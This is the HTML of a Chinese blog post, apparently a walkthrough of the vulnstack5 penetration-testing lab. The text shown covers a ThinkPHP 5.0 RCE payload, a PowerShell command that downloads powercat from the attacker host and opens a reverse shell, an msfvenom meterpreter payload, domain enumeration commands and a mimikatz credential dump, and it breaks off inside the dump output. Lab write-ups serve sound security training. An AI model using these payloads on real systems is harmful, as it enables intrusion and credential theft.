@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;7&#x2F; 环境部署：Win7Win7做Web服务器，有两条网卡，分别连通内外网：  123内网IP：192.168.138.136外网IP：192.168.135.150注意手动打开phpstudy  Windows 2008Windows 2008只有一个网卡连接，处于内网无法与外网通信：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透——vulnstack5">
+<meta property="og:url" content="https://r4inb00w.github.io/2022/11/08/vulnstack5/index.html">
+<meta property="og:site_name" content="rainb0w">
+<meta property="og:description" content="靶场下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;7&#x2F; 环境部署：Win7Win7做Web服务器，有两条网卡，分别连通内外网：  123内网IP：192.168.138.136外网IP：192.168.135.150注意手动打开phpstudy  Windows 2008Windows 2008只有一个网卡连接，处于内网无法与外网通信：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg">
+<meta property="article:published_time" content="2022-11-08T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-10T02:45:27.338Z">
+<meta property="article:author" content="rainb0w">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网渗透——vulnstack5</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/01/badusb/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/07/01/vulnstack1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/11/08/vulnstack5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&text=内网渗透——vulnstack5"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&is_video=false&description=内网渗透——vulnstack5"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透——vulnstack5&body=Check out this article: https://r4inb00w.github.io/2022/11/08/vulnstack5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&name=内网渗透——vulnstack5&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/11/08/vulnstack5/&t=内网渗透——vulnstack5"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">环境部署：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Win7"><span class="toc-number">1.1.</span> <span class="toc-text">Win7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-2008"><span class="toc-number">1.2.</span> <span class="toc-text">Windows 2008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">攻击机：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">外网渗透：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">内网信息收集：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E5%8F%8A%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">路由转发及隐藏通信隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec%E7%99%BB%E9%99%86%E5%9F%9F%E6%8E%A7"><span class="toc-number">5.</span> <span class="toc-text">psexec登陆域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.</span> <span class="toc-text">黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">痕迹清理</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        内网渗透——vulnstack5
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">rainb0w</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-08T00:00:00.000Z" class="dt-published" itemprop="datePublished">2022-11-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p>
+<h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><h3 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h3><p>Win7做Web服务器，有两条网卡，分别连通内外网：</p>
+<p><img src="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.136</span><br><span class="line">外网IP：192.168.135.150</span><br><span class="line">注意手动打开phpstudy</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-2008"><a href="#Windows-2008" class="headerlink" title="Windows 2008"></a>Windows 2008</h3><p>Windows 2008只有一个网卡连接，处于内网无法与外网通信：</p>
+<p><img src="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.138</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网IP：192.168.135.128</span><br></pre></td></tr></table></figure>
+
+<p>VMnet2网卡设置如下：</p>
+<p><img src="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg"></p>
+<h2 id="外网渗透："><a href="#外网渗透：" class="headerlink" title="外网渗透："></a>外网渗透：</h2><p><img src="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg"></p>
+<p>进入网页后，可以发现部署的是5.0版本的ThinkPHP，去网上搜一搜能发现不少payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>利用网上的payload打一下：</p>
+<p><img src="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg"></p>
+<p>RCE成功。接下来利用powercat反弹一下shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.135.128:1235/powercat.ps1&#x27;);powercat -c 192.168.135.128 -p 1234 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg"></p>
+<p><img src="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg"></p>
+<p>反弹成功。</p>
+<p>接下来利用metasploit制作一个exe，在靶机中下载下来然后执行，把meterpreter反弹出来:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=1236 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg"></p>
+<p>接下来msf监听，在拿到的shell中执行下载的木马文件，拿到meterpreter：</p>
+<p><img src="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg"></p>
+<h2 id="内网信息收集："><a href="#内网信息收集：" class="headerlink" title="内网信息收集："></a>内网信息收集：</h2><p>在meterpreter执行getsystem即可拿到system权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net time /domain    #判断主域，主域服务器一般做时间服务器</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line">ipconfig /all #查询本机IP段，所在域等</span><br></pre></td></tr></table></figure>
+
+<p>执行ipconfig &#x2F;all可以发现Web服务器的内网IP为192.168.138.136，并且DNS server为192.168.138.138：</p>
+<p><img src="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg"></p>
+<p>IP为192.168.138.138的这台机器应该就是DC了。根据ipconfig &#x2F;all返回的内容也可以得知当前所在域为sun.com。可以判断出我们最开始拿到的shell的用户就是域管：</p>
+<p><img src="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg"></p>
+<p>域中的用户如下：</p>
+<p><img src="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg"></p>
+<p>内网主机如下所示：</p>
+<p><img src="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg"></p>
+<p>查看有多少域：</p>
+<p><img src="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg"></p>
+<p>由于msf的mimikatz一直不好用，我们自己上传一个，然后拿一下密码：</p>
+<p><img src="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg"></p>
+<p><img src="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg"></p>
+<p>拿一下系统密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#权限提升</span><br><span class="line">sekurlsa::logonPasswords#明文抓取</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1372017 (00000000:0014ef71)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:10:01</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * LM       : c8c42d085b5e3da2e9260223765451f1</span><br><span class="line">	 * NTLM     : e8bea972b3549868cecd667a64a6ac46</span><br><span class="line">	 * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : dc123.com</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : dc123.com</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : SUN.COM</span><br><span class="line">	 * Password : dc123.com</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 578158 (00000000:0008d26e)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : leo</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:06:13</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-1110</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : leo</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * LM       : b73a13e9b7832a35aad3b435b51404ee</span><br><span class="line">	 * NTLM     : afffeba176210fad4628f0524bfe1942</span><br><span class="line">	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : leo</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : 123.com</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : leo</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : 123.com</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : leo</span><br><span class="line">	 * Domain   : SUN.COM</span><br><span class="line">	 * Password : 123.com</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN7$</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line">	 * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN7$</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win7$</span><br><span class="line">	 * Domain   : SUN.COM</span><br><span class="line">	 * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 